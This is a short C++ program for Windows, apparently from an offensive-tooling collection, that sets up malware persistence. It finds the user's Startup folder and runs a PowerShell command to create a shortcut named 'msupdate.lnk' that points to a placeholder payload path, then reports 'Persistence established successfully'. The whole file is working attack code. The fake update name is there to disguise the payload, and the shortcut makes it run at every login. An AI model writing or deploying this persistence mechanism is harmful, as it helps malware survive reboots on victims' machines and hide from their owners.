// Author: Nemuel Wainaina

#include <iostream>
#include <windows.h>
#include <shlobj.h>

int main() {
    const wchar_t* src =  L"Path\\To\\Your\\Payload.exe";
    wchar_t destPath[MAX_PATH];
    wchar_t command[512];

    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, destPath) != S_OK) {
        return 1;
    }
    wcscat(destPath, L"\\msupdate.lnk");

    swprintf(command,
        L"powershell -Command \"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('%s');"
        L"$s.TargetPath = '%s'; $s.Save();\"", destPath, src);
    
    int result = _wsystem(command);
    if (result == 0) {
        std::cout << "Persistence established successfully" << std::endl;
    } else {
        std::cerr << "Persistence failed" << std::endl;
        return 1;
    }

    return 0;
}
